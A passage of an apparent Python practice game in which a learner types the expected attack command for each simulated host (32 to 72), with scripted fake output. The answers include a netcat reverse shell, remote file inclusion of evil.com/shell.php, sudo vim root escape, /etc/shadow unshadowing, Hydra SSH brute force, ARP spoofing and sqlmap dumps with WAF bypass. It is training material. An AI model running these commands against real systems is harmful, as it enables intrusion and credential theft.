        print("Your task is to gain access to a system by impersonating someone.")
        print(Fore.YELLOW + "Hint: Craft a convincing email to the sysadmin requesting a password reset." + Style.RESET_ALL)
        cmd1 = "python3 craft_email.py"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Email sent. Password reset received." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 33: Reverse Shell Establishment
def host_thirty_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 33: Reverse Shell Establishment" + Style.RESET_ALL)
        print("Your task is to establish a reverse shell connection.")
        print(Fore.YELLOW + "Hint: Use Netcat to set up the listener." + Style.RESET_ALL)
        cmd1 = "nc -lvp 4444"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Listener set up on port 4444." + Style.RESET_ALL)
            print("Now, execute the reverse shell command on the target machine.")
            cmd2 = "nc 192.168.1.33 4444 -e /bin/sh"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: Reverse shell established!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 34: Password Cracking
def host_thirty_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 34: Password Cracking" + Style.RESET_ALL)
        print("Your task is to crack hashed passwords.")
        print(Fore.YELLOW + "Hint: Use a password cracking tool like John the Ripper." + Style.RESET_ALL)
        cmd1 = "john --wordlist=rockyou.txt hashes.txt"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Passwords cracked successfully!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 35: Privilege Escalation via Misconfigured Sudo
def host_thirty_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 35: Privilege Escalation via Misconfigured Sudo" + Style.RESET_ALL)
        print("Your task is to escalate privileges on a Linux machine using a misconfigured sudo.")
        print(Fore.YELLOW + "Hint: Use 'sudo -l' to list the allowed commands." + Style.RESET_ALL)
        cmd1 = "sudo -l"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: User may run the following commands: (root) NOPASSWD: /usr/bin/vim" + Style.RESET_ALL)
            print("Now, escalate privileges using the allowed command.")
            cmd2 = "sudo vim -c ':!bash'"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: Root shell obtained!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 36: Data Exfiltration
def host_thirty_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 36: Data Exfiltration" + Style.RESET_ALL)
        print("Your task is to exfiltrate sensitive data from a target system.")
        print(Fore.YELLOW + "Hint: Use SCP to transfer files securely." + Style.RESET_ALL)
        cmd1 = "scp user@192.168.1.36:/path/to/data.txt ."
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Data file transferred successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 37: Man-in-the-Middle Attack
def host_thirty_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 37: Man-in-the-Middle Attack" + Style.RESET_ALL)
        print("Your task is to perform a Man-in-the-Middle attack to capture sensitive data.")
        print(Fore.YELLOW + "Hint: Use ARP spoofing to redirect traffic." + Style.RESET_ALL)
        cmd1 = "arpspoof -i eth0 -t 192.168.1.1 192.168.1.37"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: ARP spoofing successful. Traffic redirected." + Style.RESET_ALL)
            print("Now, capture the traffic using Wireshark or tcpdump.")
            cmd2 = "tcpdump -i eth0 -w mitm.pcap"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: Traffic captured and saved to mitm.pcap." + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 38: SQL Injection
def host_thirty_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 38: SQL Injection" + Style.RESET_ALL)
        print("Your task is to exploit an SQL Injection vulnerability to dump the database.")
        print(Fore.YELLOW + "Hint: Use a tool like sqlmap to automate the exploitation." + Style.RESET_ALL)
        cmd1 = "sqlmap -u 'http://192.168.1.38/vuln_page.php?id=1' --dump"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Database dumped successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 39: Enumerating LDAP
def host_thirty_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 39: Enumerating LDAP" + Style.RESET_ALL)
        print("Your task is to enumerate an LDAP server to find sensitive information.")
        print(Fore.YELLOW + "Hint: Use ldapsearch to query the LDAP server." + Style.RESET_ALL)
        cmd1 = "ldapsearch -x -h 192.168.1.39 -b 'dc=example,dc=com'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: LDAP entries enumerated successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 40: Exploiting WebLogic Server
def host_forty():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 40: Exploiting WebLogic Server" + Style.RESET_ALL)
        print("Your task is to exploit a vulnerable Oracle WebLogic Server.")
        print(Fore.YELLOW + "Hint: Use a known RCE exploit for WebLogic Server." + Style.RESET_ALL)
        cmd1 = "python3 weblogic_rce.py 192.168.1.40"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Exploit successful! You have gained remote access." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 41: Exploiting WordPress Vulnerabilities
def host_forty_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 41: Exploiting WordPress Vulnerabilities" + Style.RESET_ALL)
        print("Your task is to exploit vulnerabilities in a WordPress site.")
        print(Fore.YELLOW + "Hint: Use WPScan to enumerate vulnerabilities." + Style.RESET_ALL)
        cmd1 = "wpscan --url http://192.168.1.41"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Vulnerabilities enumerated. CVE-2021-1234 discovered." + Style.RESET_ALL)
            print("Now, exploit the vulnerability using Metasploit.")
            cmd2 = "msfconsole -q -x 'use exploit/multi/http/wp_cve_2021_1234; set RHOSTS 192.168.1.41; run'"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: Exploit successful! Shell access granted." + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 42: Decompiling Java Bytecode
def host_forty_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 42: Decompiling Java Bytecode" + Style.RESET_ALL)
        print("Your task is to decompile a Java .class file to understand its logic.")
        print(Fore.YELLOW + "Hint: Use a tool like jd-gui for decompilation." + Style.RESET_ALL)
        cmd1 = "jd-gui target.class"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Decompiled source code available." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 43: Cracking ZIP File Password
def host_forty_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 43: Cracking ZIP File Password" + Style.RESET_ALL)
        print("Your task is to crack the password of a ZIP file.")
        print(Fore.YELLOW + "Hint: Use fcrackzip with a wordlist." + Style.RESET_ALL)
        cmd1 = "fcrackzip -u -D -p 'rockyou.txt' secret.zip"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Password cracked! The password is '123456'." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 44: Exploiting Weak SNMP Configurations
def host_forty_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 44: Exploiting Weak SNMP Configurations" + Style.RESET_ALL)
        print("Your task is to exploit weak SNMP configurations to gather information.")
        print(Fore.YELLOW + "Hint: Use snmpwalk to query the SNMP service." + Style.RESET_ALL)
        cmd1 = "snmpwalk -v2c -c public 192.168.1.44"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: SNMP data gathered successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 45: Discovering Hidden Directories in Web Servers
def host_forty_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 45: Discovering Hidden Directories in Web Servers" + Style.RESET_ALL)
        print("Your task is to discover hidden directories on a web server.")
        print(Fore.YELLOW + "Hint: Use a tool like Dirbuster or dirb." + Style.RESET_ALL)
        cmd1 = "dirb http://192.168.1.45/"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Hidden directory '/admin' discovered." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 46: Wireless Network Cracking
def host_forty_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 46: Wireless Network Cracking" + Style.RESET_ALL)
        print("Your task is to crack the password of a WPA2 wireless network.")
        print(Fore.YELLOW + "Hint: Use airodump-ng to capture the handshake." + Style.RESET_ALL)
        cmd1 = "airodump-ng wlan0 -w capture"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Handshake captured." + Style.RESET_ALL)
            print("Now, use aircrack-ng to crack the password.")
            cmd2 = "aircrack-ng capture-01.cap -w rockyou.txt"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: Password cracked! The password is 'password123'." + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 47: OS Fingerprinting
def host_forty_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 47: OS Fingerprinting" + Style.RESET_ALL)
        print("Your task is to determine the operating system of a target host.")
        print(Fore.YELLOW + "Hint: Use nmap for OS detection." + Style.RESET_ALL)
        cmd1 = "nmap -O 192.168.1.47"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: OS detected as Linux 4.4." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 48: Local File Inclusion (LFI)
def host_forty_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 48: Local File Inclusion (LFI)" + Style.RESET_ALL)
        print("Your task is to exploit a Local File Inclusion vulnerability.")
        print(Fore.YELLOW + "Hint: Use the ../ sequence to traverse directories." + Style.RESET_ALL)
        cmd1 = "curl 'http://192.168.1.48/vuln.php?file=../../etc/passwd'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: /etc/passwd file contents displayed." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 49: Remote File Inclusion (RFI)
def host_forty_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 49: Remote File Inclusion (RFI)" + Style.RESET_ALL)
        print("Your task is to exploit a Remote File Inclusion vulnerability.")
        print(Fore.YELLOW + "Hint: Include a remote PHP shell URL." + Style.RESET_ALL)
        cmd1 = "curl 'http://192.168.1.49/vuln.php?file=http://evil.com/shell.php'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Remote PHP shell executed." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 50: Web Shell Upload and Execution
def host_fifty():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 50: Web Shell Upload and Execution" + Style.RESET_ALL)
        print("Your task is to upload and execute a web shell on a vulnerable server.")
        print(Fore.YELLOW + "Hint: Use curl to upload the web shell." + Style.RESET_ALL)
        cmd1 = "curl -F 'file=@webshell.php' http://192.168.1.50/upload.php"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Web shell uploaded successfully." + Style.RESET_ALL)
            print("Now, navigate to the web shell URL and execute a command.")
            cmd2 = "curl 'http://192.168.1.50/uploads/webshell.php?cmd=id'"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 51: Brute-Forcing SSH
def host_fifty_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 51: Brute-Forcing SSH" + Style.RESET_ALL)
        print("Your task is to brute-force SSH credentials.")
        print(Fore.YELLOW + "Hint: Use Hydra for SSH brute-forcing." + Style.RESET_ALL)
        cmd1 = "hydra -l root -P rockyou.txt ssh://192.168.1.51"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Credentials found! root:password" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 52: DNS Enumeration
def host_fifty_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 52: DNS Enumeration" + Style.RESET_ALL)
        print("Your task is to enumerate DNS records of a target domain.")
        print(Fore.YELLOW + "Hint: Use a tool like dnsenum." + Style.RESET_ALL)
        cmd1 = "dnsenum example.com"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Various DNS records found, including A, CNAME, and MX." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 53: Password Cracking with John the Ripper
def host_fifty_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 53: Password Cracking with John the Ripper" + Style.RESET_ALL)
        print("Your task is to crack password hashes using John the Ripper.")
        print(Fore.YELLOW + "Hint: First, unshadow the passwd and shadow files." + Style.RESET_ALL)
        cmd1 = "unshadow /etc/passwd /etc/shadow > unshadowed.txt"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Unshadowed file created." + Style.RESET_ALL)
            print("Now, use John the Ripper to crack the passwords.")
            cmd2 = "john unshadowed.txt"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: Passwords cracked! user1:123456" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 54: Exploiting Buffer Overflow
def host_fifty_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 54: Exploiting Buffer Overflow" + Style.RESET_ALL)
        print("Your task is to exploit a buffer overflow vulnerability.")
        print(Fore.YELLOW + "Hint: Use a Python script to send a payload." + Style.RESET_ALL)
        cmd1 = "python3 buffer_overflow_exploit.py"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Exploit successful! Shell access granted." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 55: Privilege Escalation
def host_fifty_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 55: Privilege Escalation" + Style.RESET_ALL)
        print("Your task is to escalate your privileges on the target system.")
        print(Fore.YELLOW + "Hint: Use a tool like BeRoot to find potential privilege escalation vectors." + Style.RESET_ALL)
        cmd1 = "beroot"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Potential privilege escalation vector found! Exploit it now." + Style.RESET_ALL)
            cmd2 = "python3 privesc_exploit.py"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: Privilege escalation successful! You are now root." + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 56: Web Application Firewall (WAF) Bypass
def host_fifty_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 56: Web Application Firewall (WAF) Bypass" + Style.RESET_ALL)
        print("Your task is to bypass a WAF to exploit a web vulnerability.")
        print(Fore.YELLOW + "Hint: Use SQLmap with WAF bypass techniques." + Style.RESET_ALL)
        cmd1 = "sqlmap --url='http://192.168.1.56/vuln.php?id=1' --tamper='between,randomcase,space2comment'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: WAF bypassed. Database dumped." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 57: Active Directory Enumeration
def host_fifty_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 57: Active Directory Enumeration" + Style.RESET_ALL)
        print("Your task is to enumerate users and groups in an Active Directory environment.")
        print(Fore.YELLOW + "Hint: Use tools like PowerView or BloodHound." + Style.RESET_ALL)
        cmd1 = "Invoke-UserHunter"
        user_input = input("PS > ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Active Directory users and groups enumerated." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 58: SQL Injection
def host_fifty_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 58: SQL Injection" + Style.RESET_ALL)
        print("Your task is to exploit a SQL Injection vulnerability to dump the database.")
        print(Fore.YELLOW + "Hint: Use SQLmap." + Style.RESET_ALL)
        cmd1 = "sqlmap --url='http://192.168.1.58/vuln.php?id=1' --dump"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Database dumped successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 59: Cross-Site Scripting (XSS)
def host_fifty_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 59: Cross-Site Scripting (XSS)" + Style.RESET_ALL)
        print("Your task is to exploit a stored Cross-Site Scripting vulnerability.")
        print(Fore.YELLOW + "Hint: Use Burp Suite to capture and modify the HTTP request." + Style.RESET_ALL)
        cmd1 = "burpsuite"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Stored XSS payload injected successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 60: XML External Entity (XXE) Attacks
def host_sixty():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 60: XML External Entity (XXE) Attacks" + Style.RESET_ALL)
        print("Your task is to exploit an XML External Entity vulnerability to read sensitive files.")
        print(Fore.YELLOW + "Hint: Use a specially crafted XML payload." + Style.RESET_ALL)
        cmd1 = "curl -X POST --data @xxe_payload.xml http://192.168.1.60/xxe"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Sensitive files read successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 61: Server Side Request Forgery (SSRF)
def host_sixty_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 61: Server Side Request Forgery (SSRF)" + Style.RESET_ALL)
        print("Your task is to exploit an SSRF vulnerability to access an internal service.")
        print(Fore.YELLOW + "Hint: Use curl to send a crafted HTTP request." + Style.RESET_ALL)
        cmd1 = "curl 'http://192.168.1.61/request.php?url=http://127.0.0.1:8080/admin'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Internal admin panel accessed successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 62: Race Condition Exploits
def host_sixty_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 62: Race Condition Exploits" + Style.RESET_ALL)
        print("Your task is to exploit a race condition vulnerability.")
        print(Fore.YELLOW + "Hint: Use a Python script to simultaneously send multiple requests." + Style.RESET_ALL)
        cmd1 = "python3 race_condition_exploit.py"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Race condition exploited! Resource accessed." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 63: HTTP Header Injection
def host_sixty_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 63: HTTP Header Injection" + Style.RESET_ALL)
        print("Your task is to inject malicious headers into an HTTP response.")
        print(Fore.YELLOW + "Hint: Use curl with a manipulated Host header." + Style.RESET_ALL)
        cmd1 = "curl -H 'Host: evil.com' http://192.168.1.63"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Malicious header injected successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 64: Cookie Manipulation
def host_sixty_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 64: Cookie Manipulation" + Style.RESET_ALL)
        print("Your task is to manipulate a cookie to bypass authentication.")
        print(Fore.YELLOW + "Hint: Use a browser's developer tools to edit cookies." + Style.RESET_ALL)
        cmd1 = "Edit cookie 'auth' to 'admin'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip().lower() == cmd1.lower():
            print(Fore.GREEN + "Output: Authentication bypassed successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 65: URL Redirection
def host_sixty_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 65: URL Redirection" + Style.RESET_ALL)
        print("Your task is to exploit a URL redirection vulnerability.")
        print(Fore.YELLOW + "Hint: Use curl to send a manipulated redirect URL." + Style.RESET_ALL)
        cmd1 = "curl 'http://192.168.1.65/redirect.php?url=http://evil.com'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: URL redirection exploited! Users sent to evil.com." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 66: LDAP Injection
def host_sixty_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 66: LDAP Injection" + Style.RESET_ALL)
        print("Your task is to exploit an LDAP Injection vulnerability to enumerate users.")
        print(Fore.YELLOW + "Hint: Use a tool like JXplorer." + Style.RESET_ALL)
        cmd1 = "jxplorer -l 'ldap://192.168.1.66' -u 'cn=admin,dc=example,dc=com' -p 'password'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: LDAP users enumerated successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 67: Remote File Inclusion (RFI)
def host_sixty_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 67: Remote File Inclusion (RFI)" + Style.RESET_ALL)
        print("Your task is to exploit a Remote File Inclusion vulnerability.")
        print(Fore.YELLOW + "Hint: Use curl to send a crafted request." + Style.RESET_ALL)
        cmd1 = "curl 'http://192.168.1.67/vuln.php?file=http://evil.com/shell.php'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Remote file included. Shell access gained." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 68: Social Engineering Attacks
def host_sixty_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 68: Social Engineering Attacks" + Style.RESET_ALL)
        print("Your task is to perform a social engineering attack to gather sensitive information.")
        print(Fore.YELLOW + "Hint: Use SET (Social-Engineer Toolkit)." + Style.RESET_ALL)
        cmd1 = "setoolkit"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Sensitive information gathered successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 69: OS Command Injection
def host_sixty_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 69: OS Command Injection" + Style.RESET_ALL)
        print("Your task is to exploit an OS Command Injection vulnerability.")
        print(Fore.YELLOW + "Hint: Use curl to send a crafted HTTP request." + Style.RESET_ALL)
        cmd1 = "curl 'http://192.168.1.69/cmd.php?cmd=id'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Command executed. uid=0(root) gid=0(root)" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

#Host 70: Eavesdropping/Traffic Interception
def host_seventy():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 70: Eavesdropping/Traffic Interception" + Style.RESET_ALL)
        print("Your task is to intercept and analyze network traffic.")
        print(Fore.YELLOW + "Hint: Use Wireshark or tcpdump." + Style.RESET_ALL)
        cmd1 = "wireshark"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Traffic intercepted and analyzed. Credentials found." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 71: Insecure Direct Object Reference (IDOR)
def host_seventy_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 71: Insecure Direct Object Reference (IDOR)" + Style.RESET_ALL)
        print("Your task is to exploit an IDOR vulnerability to access unauthorized data.")
        print(Fore.YELLOW + "Hint: Manipulate object references in the URL." + Style.RESET_ALL)
        cmd1 = "curl 'http://192.168.1.71/data.php?id=500'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Unauthorized data accessed." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 72: S3 Bucket Enumeration
def host_seventy_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 72: S3 Bucket Enumeration" + Style.RESET_ALL)
